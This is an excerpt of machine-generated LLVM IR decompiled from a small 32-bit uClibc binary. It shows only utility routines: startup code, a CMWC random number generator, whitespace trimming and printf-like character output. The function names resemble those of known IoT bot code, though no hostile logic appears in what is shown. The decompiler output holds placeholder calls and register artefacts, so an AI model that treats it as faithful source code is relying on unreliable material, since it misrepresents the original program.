dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v4_8048166 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v4_8048166, i32* @ecx, align 4
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v9_8048180 = call i32 @__uClibc_main(i32 134544671, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134575784, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  ret i32 %v9_8048180

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_805b540.7, align 64
  %v1_8048199 = add i32 %arg1, -1640531527
  store i32 %v1_8048199, i32* @global_var_805b544.8, align 4
  %v1_80481a6 = add i32 %arg1, 1013904242
  store i32 %v1_80481a6, i32* %eax.global-to-local, align 4
  store i32 %v1_80481a6, i32* @global_var_805b548.9, align 8
  br label %dec_label_pc_80481b9

dec_label_pc_80481b9:                             ; preds = %entry, %dec_label_pc_80481b9
  %storemerge5 = phi i32 [ 3, %entry ], [ %v4_80481e9, %dec_label_pc_80481b9 ]
  %v1_80481bf = add nsw i32 %storemerge5, -3
  store i32 %v1_80481bf, i32* %eax.global-to-local, align 4
  %v1_80481c2 = mul nuw nsw i32 %v1_80481bf, 4
  %v2_80481c2 = add i32 %v1_80481c2, ptrtoint (i32* @global_var_805b540.7 to i32)
  %v3_80481c2 = inttoptr i32 %v2_80481c2 to i32*
  %v4_80481c2 = load i32, i32* %v3_80481c2, align 4
  %v1_80481cc = add nsw i32 %storemerge5, -2
  store i32 %v1_80481cc, i32* %eax.global-to-local, align 4
  %v1_80481cf = mul nuw nsw i32 %v1_80481cc, 4
  %v2_80481cf = add i32 %v1_80481cf, ptrtoint (i32* @global_var_805b540.7 to i32)
  %v3_80481cf = inttoptr i32 %v2_80481cf to i32*
  %v4_80481cf = load i32, i32* %v3_80481cf, align 4
  %v2_80481d6 = xor i32 %v4_80481cf, %v4_80481c2
  %v2_80481db = xor i32 %storemerge5, -1640531527
  %v1_80481dd = xor i32 %v2_80481db, %v2_80481d6
  store i32 %v1_80481dd, i32* %eax.global-to-local, align 4
  %v2_80481e2 = mul nuw nsw i32 %storemerge5, 4
  %v3_80481e2 = add i32 %v2_80481e2, ptrtoint (i32* @global_var_805b540.7 to i32)
  %v4_80481e2 = inttoptr i32 %v3_80481e2 to i32*
  store i32 %v1_80481dd, i32* %v4_80481e2, align 4
  %v4_80481e9 = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_80481e9, 4096
  br i1 %exitcond, label %dec_label_pc_80481f5, label %dec_label_pc_80481b9

dec_label_pc_80481f5:                             ; preds = %dec_label_pc_80481b9
  %v0_80481f6 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80481f6

; uselistorder directives
  uselistorder i32 %storemerge5, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80481b9, { 1, 0 }
}

define i32 @rand_cmwc(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048213 = load i32, i32* @global_var_805b270.10, align 16
  %v1_8048218 = add i32 %v0_8048213, 1
  %v1_8048219 = urem i32 %v1_8048218, 4096
  store i32 %v1_8048219, i32* @global_var_805b270.10, align 16
  %v1_8048228 = mul nuw nsw i32 %v1_8048219, 4
  %v2_8048228 = add i32 %v1_8048228, ptrtoint (i32* @global_var_805b540.7 to i32)
  %v3_8048228 = inttoptr i32 %v2_8048228 to i32*
  %v4_8048228 = load i32, i32* %v3_8048228, align 4
  %v7_8048245 = udiv i32 %v4_8048228, 228675
  store i32 %v7_8048245, i32* @global_var_805b26c.11, align 4
  br i1 true, label %dec_label_pc_8048295, label %dec_label_pc_8048287

dec_label_pc_8048287:                             ; preds = %entry
  br label %dec_label_pc_8048295

dec_label_pc_8048295:                             ; preds = %entry, %dec_label_pc_8048287
  store i32 %v1_8048219, i32* @ecx, align 4
  %v1_80482aa = mul nuw nsw i32 %v1_8048219, 4
  %v2_80482aa = add i32 %v1_80482aa, ptrtoint (i32* @global_var_805b540.7 to i32)
  %v3_80482aa = inttoptr i32 %v2_80482aa to i32*
  %v4_80482aa = load i32, i32* %v3_80482aa, align 4
  ret i32 %v4_80482aa

; uselistorder directives
  uselistorder i32 %v1_8048219, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8048295, { 1, 0 }
}

define i32 @trim() local_unnamed_addr {
entry:
  %tmp10 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %v0_80482ba = load i32, i32* @edi, align 4
  store i32 %v0_80482ba, i32* %stack_var_-8, align 4
  %v4_80482c5 = ptrtoint i8* %tmp10 to i32
  store i1 false, i1* @df, align 1
  %v3_80482d6 = call i32 @_strlen(i8* %tmp10)
  %v1_80482dd = add i32 %v3_80482d6, -1
  br label %dec_label_pc_80482e6

dec_label_pc_80482e3:                             ; preds = %dec_label_pc_80482e6
  %v4_80482e3 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_80482e6

dec_label_pc_80482e6:                             ; preds = %entry, %dec_label_pc_80482e3
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_80482e3, %dec_label_pc_80482e3 ]
  %v6_80482e9 = add i32 %stack_var_-16.0, %v4_80482c5
  %v1_80482ec = inttoptr i32 %v6_80482e9 to i8*
  %v2_80482ec = load i8, i8* %v1_80482ec, align 1
  %v2_80482ee = sext i8 %v2_80482ec to i32
  %v1_80482f5 = call i32 @isspace(i32 %v2_80482ee)
  %v1_80482fd = icmp eq i32 %v1_80482f5, 0
  %v1_80482ff = icmp eq i1 %v1_80482fd, false
  br i1 %v1_80482ff, label %dec_label_pc_80482e3, label %dec_label_pc_8048306.preheader

dec_label_pc_8048306.preheader:                   ; preds = %dec_label_pc_80482e6
  %v5_804830c24 = icmp slt i32 %v1_80482dd, %stack_var_-16.0
  br i1 %v5_804830c24, label %dec_label_pc_8048329, label %dec_label_pc_804830e.lr.ph

dec_label_pc_804830e.lr.ph:                       ; preds = %dec_label_pc_8048306.preheader
  br label %dec_label_pc_804830e

dec_label_pc_8048303:                             ; preds = %dec_label_pc_804830e
  %v5_8048303 = add i32 %stack_var_-12.0.in25, -1
  %v5_804830c = icmp slt i32 %v5_8048303, %stack_var_-16.0
  br i1 %v5_804830c, label %dec_label_pc_8048329, label %dec_label_pc_804830e

dec_label_pc_804830e:                             ; preds = %dec_label_pc_804830e.lr.ph, %dec_label_pc_8048303
  %stack_var_-12.0.in25 = phi i32 [ %v1_80482dd, %dec_label_pc_804830e.lr.ph ], [ %v5_8048303, %dec_label_pc_8048303 ]
  %v6_8048311 = add i32 %stack_var_-12.0.in25, %v4_80482c5
  %v1_8048314 = inttoptr i32 %v6_8048311 to i8*
  %v2_8048314 = load i8, i8* %v1_8048314, align 1
  %v2_8048316 = sext i8 %v2_8048314 to i32
  %v1_804831d = call i32 @isspace(i32 %v2_8048316)
  %v1_8048325 = icmp eq i32 %v1_804831d, 0
  %v1_8048327 = icmp eq i1 %v1_8048325, false
  br i1 %v1_8048327, label %dec_label_pc_8048303, label %dec_label_pc_8048329

dec_label_pc_8048329:                             ; preds = %dec_label_pc_8048303, %dec_label_pc_804830e, %dec_label_pc_8048306.preheader
  %stack_var_-12.0.in.lcssa = phi i32 [ %v1_80482dd, %dec_label_pc_8048306.preheader ], [ %stack_var_-12.0.in25, %dec_label_pc_804830e ], [ %v5_8048303, %dec_label_pc_8048303 ]
  %v7_804835118 = icmp sgt i32 %stack_var_-16.0, %stack_var_-12.0.in.lcssa
  br i1 %v7_804835118, label %dec_label_pc_8048353, label %dec_label_pc_8048331

dec_label_pc_8048331:                             ; preds = %dec_label_pc_8048329, %dec_label_pc_8048331
  %v6_804835b20 = phi i32 [ %v6_804835b, %dec_label_pc_8048331 ], [ %v4_80482c5, %dec_label_pc_8048329 ]
  %storemerge.in19 = phi i32 [ %v5_8048348, %dec_label_pc_8048331 ], [ %stack_var_-16.0, %dec_label_pc_8048329 ]
  %v6_8048341 = add i32 %storemerge.in19, %v4_80482c5
  %v1_8048344 = inttoptr i32 %v6_8048341 to i8*
  %v2_8048344 = load i8, i8* %v1_8048344, align 1
  %v3_8048346 = inttoptr i32 %v6_804835b20 to i8*
  store i8 %v2_8048344, i8* %v3_8048346, align 1
  %v5_8048348 = add i32 %storemerge.in19, 1
  %v7_8048351 = icmp sgt i32 %v5_8048348, %stack_var_-12.0.in.lcssa
  %v2_8048359 = sub i32 %v5_8048348, %stack_var_-16.0
  %v6_804835b = add i32 %v2_8048359, %v4_80482c5
  br i1 %v7_8048351, label %dec_label_pc_8048353, label %dec_label_pc_8048331

dec_label_pc_8048353:                             ; preds = %dec_label_pc_8048331, %dec_label_pc_8048329
  %v6_804835b.lcssa = phi i32 [ %v4_80482c5, %dec_label_pc_8048329 ], [ %v6_804835b, %dec_label_pc_8048331 ]
  %v22_804835b = inttoptr i32 %v6_804835b.lcssa to i8*
  store i8 0, i8* %v22_804835b, align 1
  %v3_8048361 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048361, i32* @edi, align 4
  ret i32 %v6_804835b.lcssa

; uselistorder directives
  uselistorder i32 %v6_804835b.lcssa, { 1, 0 }
  uselistorder i32 %v5_8048348, { 2, 1, 0 }
  uselistorder i32 %stack_var_-12.0.in.lcssa, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.in25, { 0, 2, 1 }
  uselistorder i32 %v5_8048303, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 %v1_80482dd, { 2, 1, 0 }
  uselistorder i32 %v4_80482c5, { 0, 2, 3, 1, 4, 5 }
  uselistorder i8* %tmp10, { 1, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder label %dec_label_pc_8048331, { 1, 0 }
  uselistorder label %dec_label_pc_8048329, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804830e, { 1, 0 }
  uselistorder label %dec_label_pc_80482e6, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804836c = icmp eq i32* %arg1, null
  br i1 %v4_804836c, label %dec_label_pc_804838b, label %dec_label_pc_8048372

dec_label_pc_8048372:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v2_8048375 = load i32, i32* %arg1, align 4
  %v3_804837a = inttoptr i32 %v2_8048375 to i8*
  store i8 %tmp8, i8* %v3_804837a, align 1
  %v2_804837f = load i32, i32* %arg1, align 4
  %v1_8048381 = add i32 %v2_804837f, 1
  store i32 %v1_8048381, i32* @edx, align 4
  store i32 %v1_8048381, i32* %arg1, align 4
  br label %dec_label_pc_804839e

dec_label_pc_804838b:                             ; preds = %entry
  %v3_8048396 = bitcast i8* %stack_var_8 to i32*
  %v4_8048396 = call i32 @__libc_write(i32 1, i32* %v3_8048396, i32 1)
  br label %dec_label_pc_804839e

dec_label_pc_804839e:                             ; preds = %dec_label_pc_8048372, %dec_label_pc_804838b
  %v0_804839f = phi i32 [ %tmp3, %dec_label_pc_8048372 ], [ %v4_8048396, %dec_label_pc_804838b ]
  ret i32 %v0_804839f

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_804839e, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp25 = icmp slt i32 %arg3, 1
  br i1 %tmp25, label %dec_label_pc_8048400, label %dec_label_pc_80483ba

dec_label_pc_80483ba:                             ; preds = %entry
  %v4_80483c1 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80483c1, i32* @edx, align 4
  %v2_80483d256 = load i8, i8* %arg2, align 1
  %v3_80483d257 = zext i8 %v2_80483d256 to i32
  %v5_80483d258 = and i32 %v4_80483c1, -256
  %v6_80483d259 = or i32 %v3_80483d257, %v5_80483d258
  %v4_80483d460 = icmp eq i8 %v2_80483d256, 0
  %v1_80483d661 = icmp eq i1 %v4_80483d460, false
  br i1 %v1_80483d661, label %dec_label_pc_80483c9, label %dec_label_pc_80483d8

dec_label_pc_80483c9:                             ; preds = %dec_label_pc_80483ba, %dec_label_pc_80483c9
  %v6_80483d264 = phi i32 [ %v6_80483d2, %dec_label_pc_80483c9 ], [ %v6_80483d259, %dec_label_pc_80483ba ]
  %v4_80483cf63 = phi i32 [ %v5_80483cc, %dec_label_pc_80483c9 ], [ %v4_80483c1, %dec_label_pc_80483ba ]
  %stack_var_-12.062 = phi i32 [ %v4_80483c9, %dec_label_pc_80483c9 ], [ 0, %dec_label_pc_80483ba ]
  %v4_80483c9 = add i32 %stack_var_-12.062, 1
  %v5_80483cc = add i32 %v4_80483cf63, 1
  %v22_80483cc = inttoptr i32 %v5_80483cc to i8*
  store i32 %v5_80483cc, i32* @edx, align 4
  %v2_80483d2 = load i8, i8* %v22_80483cc, align 1
  %v3_80483d2 = zext i8 %v2_80483d2 to i32
  %v5_80483d2 = and i32 %v6_80483d264, -256
  %v6_80483d2 = or i32 %v3_80483d2, %v5_80483d2
  %v4_80483d4 = icmp eq i8 %v2_80483d2, 0
  %v1_80483d6 = icmp eq i1 %v4_80483d4, false
  br i1 %v1_80483d6, label %dec_label_pc_80483c9, label %dec_label_pc_80483d8

dec_label_pc_80483d8:                             ; preds = %dec_label_pc_80483c9, %dec_label_pc_80483ba
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_80483ba ], [ %v4_80483c9, %dec_label_pc_80483c9 ]
  %v5_80483de = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_80483de, label %dec_label_pc_80483e9, label %dec_label_pc_80483ef

dec_label_pc_80483e9:                             ; preds = %dec_label_pc_80483d8
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_80483ec = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_80483ef

dec_label_pc_80483ef:                             ; preds = %dec_label_pc_80483d8, %dec_label_pc_80483e9
  %storemerge = phi i32 [ %v5_80483ec, %dec_label_pc_80483e9 ], [ 0, %dec_label_pc_80483d8 ]
  %v1_80483f2 = and i32 %arg4, 2
  %tmp26 = mul nuw nsw i32 %v1_80483f2, 8
  %tmp27 = or i32 %tmp26, 32
  br label %dec_label_pc_8048400

dec_label_pc_8048400:                             ; preds = %dec_label_pc_80483ef, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_80483ef ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp27, %dec_label_pc_80483ef ]
  %v1_8048403 = urem i32 %arg4, 2
  %v2_8048403 = icmp eq i32 %v1_8048403, 0
  %v1_8048408 = icmp eq i1 %v2_8048403, false
  %.pre11 = inttoptr i32 %arg1 to i32*
  br i1 %v1_8048408, label %dec_label_pc_804844a.preheader, label %dec_label_pc_8048423.preheader

dec_label_pc_8048423.preheader:                   ; preds = %dec_label_pc_8048400
  %tmp2849 = icmp slt i32 %stack_var_12.0, 1
  %tmp2950 = icmp eq i1 %tmp2849, false
  br i1 %tmp2950, label %dec_label_pc_804840c.lr.ph, label %dec_label_pc_804844a.preheader

dec_label_pc_804840c.lr.ph:                       ; preds = %dec_label_pc_8048423.preheader
  br label %dec_label_pc_804840c

dec_label_pc_804840c:                             ; preds = %dec_label_pc_804840c.lr.ph, %dec_label_pc_804840c
  %stack_var_-20.052 = phi i32 [ 0, %dec_label_pc_804840c.lr.ph ], [ %v4_804841d, %dec_label_pc_804840c ]
  %stack_var_12.151 = phi i32 [ %stack_var_12.0, %dec_label_pc_804840c.lr.ph ], [ %v4_8048420, %dec_label_pc_804840c ]
  %v3_8048415 = call i32 @printchar(i32* %.pre11, i32 %stack_var_-16.0)
  %v4_804841d = add i32 %stack_var_-20.052, 1
  %v4_8048420 = add i32 %stack_var_12.151, -1
  %tmp28 = icmp slt i32 %v4_8048420, 1
  %tmp29 = icmp eq i1 %tmp28, false
  br i1 %tmp29, label %dec_label_pc_804840c, label %dec_label_pc_804844a.preheader

dec_label_pc_804844a.preheader:                   ; preds = %dec_label_pc_8048423.preheader, %dec_label_pc_804840c, %dec_label_pc_8048400
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_8048400 ], [ %stack_var_12.0, %dec_label_pc_8048423.preheader ], [ %v4_8048420, %dec_label_pc_804840c ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_8048400 ], [ 0, %dec_label_pc_8048423.preheader ], [ %v4_804841d, %dec_label_pc_804840c ]
  %v2_804844d38 = load i8, i8* %arg2, align 1
  %v4_804844f42 = icmp eq i8 %v2_804844d38, 0
  %v1_804845143 = icmp eq i1 %v4_804844f42, false
  br i1 %v1_804845143, label %dec_label_pc_804842b.lr.ph, label %dec_label_pc_804846c.preheader

dec_label_pc_804842b.lr.ph:                       ; preds = %dec_label_pc_804844a.preheader
  %v4_804844a37 = ptrtoint i8* %arg2 to i32
  br label %dec_label_pc_804842b

dec_label_pc_804842b:                             ; preds = %dec_label_pc_804842b.lr.ph, %dec_label_pc_804842b
  %v4_804844a46 = phi i32 [ %v4_804844a37, %dec_label_pc_804842b.lr.ph ], [ %v5_8048447, %dec_label_pc_804842b ]
  %stack_var_-20.145 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_804842b.lr.ph ], [ %v4_8048444, %dec_label_pc_804842b ]
  %stack_var_8.044 = phi i8* [ %arg2, %dec_label_pc_804842b.lr.ph ], [ %v22_8048447, %dec_label_pc_804842b ]
  %v2_804842e = load i8, i8* %stack_var_8.044, align 1
  %v3_804842e = zext i8 %v2_804842e to i32
  %v3_804843c = call i32 @printchar(i32* %.pre11, i32 %v3_804842e)
  %v4_8048444 = add i32 %stack_var_-20.145, 1
  %v5_8048447 = add i32 %v4_804844a46, 1
  %v22_8048447 = inttoptr i32 %v5_8048447 to i8*
  %v2_804844d = load i8, i8* %v22_8048447, align 1
  %v4_804844f = icmp eq i8 %v2_804844d, 0
  %v1_8048451 = icmp eq i1 %v4_804844f, false
  br i1 %v1_8048451, label %dec_label_pc_804842b, label %dec_label_pc_804846c.preheader

dec_label_pc_804846c.preheader:                   ; preds = %dec_label_pc_804842b, %dec_label_pc_804844a.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_804844a.preheader ], [ %v4_8048444, %dec_label_pc_804842b ]
  %tmp3033 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp3134 = icmp eq i1 %tmp3033, false
  br i1 %tmp3134, label %dec_label_pc_8048455.lr.ph, label %dec_label_pc_8048472

dec_label_pc_8048455.lr.ph:                       ; preds = %dec_label_pc_804846c.preheader
  br label %dec_label_pc_8048455

dec_label_pc_8048455:                             ; preds = %dec_label_pc_8048455.lr.ph, %dec_label_pc_8048455
  %stack_var_-20.236 = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_8048455.lr.ph ], [ %v4_8048466, %dec_label_pc_8048455 ]
  %stack_var_12.335 = phi i32 [ %stack_var_12.2.ph, %dec_label_pc_8048455.lr.ph ], [ %v4_8048469, %dec_label_pc_8048455 ]
  %v3_804845e = call i32 @printchar(i32* %.pre11, i32 %stack_var_-16.0)
  %v4_8048466 = add i32 %stack_var_-20.236, 1
  %v4_8048469 = add i32 %stack_var_12.335, -1
  %tmp30 = icmp slt i32 %v4_8048469, 1
  %tmp31 = icmp eq i1 %tmp30, false
  br i1 %tmp31, label %dec_label_pc_8048455, label %dec_label_pc_8048472

dec_label_pc_8048472:                             ; preds = %dec_label_pc_8048455, %dec_label_pc_804846c.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_804846c.preheader ], [ %v4_8048466, %dec_label_pc_8048455 ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v5_8048447, { 1, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_80483cc, { 1, 2, 0 }
  uselistorder i32 %v4_80483c1, { 0, 2, 1 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 1, 3, 2, 0, 4 }
  uselistorder label %dec_label_pc_8048455, { 1, 0 }
  uselistorder label %dec_label_pc_804842b, { 1, 0 }
  uselistorder label %dec_label_pc_804844a.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804840c, { 1, 0 }
  uselistorder label %dec_label_pc_80483ef, { 1, 0 }
  uselistorder label %dec_label_pc_80483c9, { 1, 0 }
}

define i32 @printi(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i8*, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = call i32 @__decompiler_undefined_function_0()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v5_804848e = sext i32 %tmp35 to i64
  %v4_8048491 = icmp eq i32 %tmp35, 0
  %v5_8048491 = icmp slt i32 %tmp35, 0
  %v1_8048495 = icmp eq i1 %v4_8048491, false
  br i1 %v1_8048495, label %dec_label_pc_80484bc, label %dec_label_pc_8048497

dec_label_pc_8048497:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp47 = bitcast i32* %stack_var_-16 to i8*
  %v6_80484ac = call i32 @prints(i32 %arg1, i8* %tmp47, i32 %tmp31, i32 %tmp32)
  br label %dec_label_pc_8048597

dec_label_pc_80484bc:                             ; preds = %entry
  %v4_80484bc = icmp eq i32 %tmp28, 0
  br i1 %v4_80484bc, label %dec_label_pc_80484dd, label %dec_label_pc_80484c2

dec_label_pc_80484c2:                             ; preds = %dec_label_pc_80484bc
  %v12_80484c2 = icmp eq i32 %tmp27, 10
  %v1_80484c6 = icmp eq i1 %v12_80484c2, false
  br i1 %v1_80484c6, label %dec_label_pc_80484dd, label %dec_label_pc_80484c8

dec_label_pc_80484c8:                             ; preds = %dec_label_pc_80484c2
  %v1_80484cc = icmp eq i1 %v5_8048491, false
  br i1 %v1_80484cc, label %dec_label_pc_80484dd, label %dec_label_pc_80484ce

dec_label_pc_80484ce:                             ; preds = %dec_label_pc_80484c8
  %v1_80484d8 = sub i32 0, %tmp35
  %v5_80484da = sext i32 %v1_80484d8 to i64
  br label %dec_label_pc_80484dd

dec_label_pc_80484dd:                             ; preds = %dec_label_pc_80484c8, %dec_label_pc_80484c2, %dec_label_pc_80484bc, %dec_label_pc_80484ce
  %stack_var_-24.0 = phi i64 [ %v5_804848e, %dec_label_pc_80484bc ], [ %v5_804848e, %dec_label_pc_80484c2 ], [ %v5_804848e, %dec_label_pc_80484c8 ], [ %v5_80484da, %dec_label_pc_80484ce ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_80484bc ], [ 0, %dec_label_pc_80484c2 ], [ 0, %dec_label_pc_80484c8 ], [ 1, %dec_label_pc_80484ce ]
  %v15_80484e0 = ptrtoint i32* %stack_var_-5 to i32
  %tmp48 = bitcast i32* %stack_var_-5 to i8*
  store i8* %tmp48, i8** %stack_var_-40, align 4
  store i8 0, i8* %tmp48, align 4
  %v4_804853e7 = trunc i64 %stack_var_-24.0 to i32
  %v5_804853e8 = icmp eq i32 %v4_804853e7, 0
  %v1_804854215 = icmp eq i1 %v5_804853e8, false
  br i1 %v1_804854215, label %dec_label_pc_80484ee.lr.ph, label %dec_label_pc_8048544

dec_label_pc_80484ee.lr.ph:                       ; preds = %dec_label_pc_80484dd
  %v5_80484f1 = sext i32 %tmp27 to i64
  br label %dec_label_pc_80484ee

dec_label_pc_80484ee:                             ; preds = %dec_label_pc_80484ee.lr.ph, %dec_label_pc_8048516
  %v3_804851618 = phi i8* [ %tmp48, %dec_label_pc_80484ee.lr.ph ], [ %v22_8048516, %dec_label_pc_8048516 ]
  %stack_var_-24.116 = phi i64 [ %stack_var_-24.0, %dec_label_pc_80484ee.lr.ph ], [ %v5_804853b, %dec_label_pc_8048516 ]
  %v6_80484fc = and i64 %stack_var_-24.116, 4294967295
  %v12_80484fc = udiv i64 %v6_80484fc, %v5_80484f1
  %v13_80484fc = trunc i64 %v12_80484fc to i32
  %v14_80484fc = urem i64 %v6_80484fc, %v5_80484f1
  %v5_8048501 = trunc i64 %v14_80484fc to i8
  %v7_8048508 = icmp sgt i8 %v5_8048501, 9
  br i1 %v7_8048508, label %dec_label_pc_804850a, label %dec_label_pc_8048516

dec_label_pc_804850a:                             ; preds = %dec_label_pc_80484ee
  %tmp52 = trunc i64 %v14_80484fc to i32
  %v5_804850d = add i32 %tmp52, %tmp
  %v1_8048510 = add i32 %v5_804850d, 198
  %v11_8048510 = trunc i32 %v1_8048510 to i8
  br label %dec_label_pc_8048516

dec_label_pc_8048516:                             ; preds = %dec_label_pc_80484ee, %dec_label_pc_804850a
  %stack_var_-36.0 = phi i8 [ %v11_8048510, %dec_label_pc_804850a ], [ %v5_8048501, %dec_label_pc_80484ee ]
  %v4_8048516 = ptrtoint i8* %v3_804851618 to i32
  %v5_8048516 = add i32 %v4_8048516, -1
  %v22_8048516 = inttoptr i32 %v5_8048516 to i8*
  %v1_804851c = add i8 %stack_var_-36.0, 48
  store i8 %v1_804851c, i8* %v22_8048516, align 1
  %v5_804853b = sext i32 %v13_80484fc to i64
  %v5_804853e = icmp eq i32 %v13_80484fc, 0
  %v1_8048542 = icmp eq i1 %v5_804853e, false
  br i1 %v1_8048542, label %dec_label_pc_80484ee, label %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge

dec_label_pc_804853e.dec_label_pc_8048544_crit_edge: ; preds = %dec_label_pc_8048516
  store i8* %v22_8048516, i8** %stack_var_-40, align 4
  br label %dec_label_pc_8048544

dec_label_pc_8048544:                             ; preds = %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge, %dec_label_pc_80484dd
  %v3_8048581622 = phi i32 [ %v5_8048516, %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge ], [ %v15_80484e0, %dec_label_pc_80484dd ]
  %v3_8048572 = phi i8* [ %v22_8048516, %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge ], [ %tmp48, %dec_label_pc_80484dd ]
  %v4_8048544 = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_8048544, label %dec_label_pc_804857b, label %dec_label_pc_804854a

dec_label_pc_804854a:                             ; preds = %dec_label_pc_8048544
  %v4_804854a = icmp eq i32 %tmp31, 0
  br i1 %v4_804854a, label %dec_label_pc_8048572, label %dec_label_pc_8048550

dec_label_pc_8048550:                             ; preds = %dec_label_pc_804854a
  %v1_8048553 = and i32 %tmp32, 2
  %v2_8048553 = icmp eq i32 %v1_8048553, 0
  br i1 %v2_8048553, label %dec_label_pc_8048572, label %dec_label_pc_804855a

dec_label_pc_804855a:                             ; preds = %dec_label_pc_8048550
  %v3_8048562 = inttoptr i32 %arg1 to i32*
  %v4_8048562 = call i32 @printchar(i32* %v3_8048562, i32 45)
  %v4_804856d = add i32 %tmp31, -1
  br label %dec_label_pc_804857b

dec_label_pc_8048572:                             ; preds = %dec_label_pc_8048550, %dec_label_pc_804854a
  %v4_8048572 = ptrtoint i8* %v3_8048572 to i32
  %v5_8048572 = add i32 %v4_8048572, -1
  %v22_8048572 = inttoptr i32 %v5_8048572 to i8*
  store i8* %v22_8048572, i8** %stack_var_-40, align 4
  store i8 45, i8* %v22_8048572, align 1
  %.phi.trans.insert = bitcast i8** %stack_var_-40 to i32*
  %v3_80485816.pre = load i32, i32* %.phi.trans.insert, align 4
  br label %dec_label_pc_804857b

dec_label_pc_804857b:                             ; preds = %dec_label_pc_8048544, %dec_label_pc_804855a, %dec_label_pc_8048572
  %v3_80485816 = phi i32 [ %v3_8048581622, %dec_label_pc_8048544 ], [ %v3_80485816.pre, %dec_label_pc_8048572 ], [ %v3_8048581622, %dec_label_pc_804855a ]
  %stack_var_20.0 = phi i32 [ %tmp31, %dec_label_pc_8048544 ], [ %tmp31, %dec_label_pc_8048572 ], [ %v4_804856d, %dec_label_pc_804855a ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8048544 ], [ 0, %dec_label_pc_8048572 ], [ 1, %dec_label_pc_804855a ]
  %v1_8048587.cast = inttoptr i32 %v3_80485816 to i8*
  %v6_8048587 = call i32 @prints(i32 %arg1, i8* %v1_8048587.cast, i32 %stack_var_20.0, i32 %tmp32)
  %v2_8048592 = add i32 %v6_8048587, %stack_var_-28.0
  store i32 %v2_8048592, i32* @edx, align 4
  br label %dec_label_pc_8048597

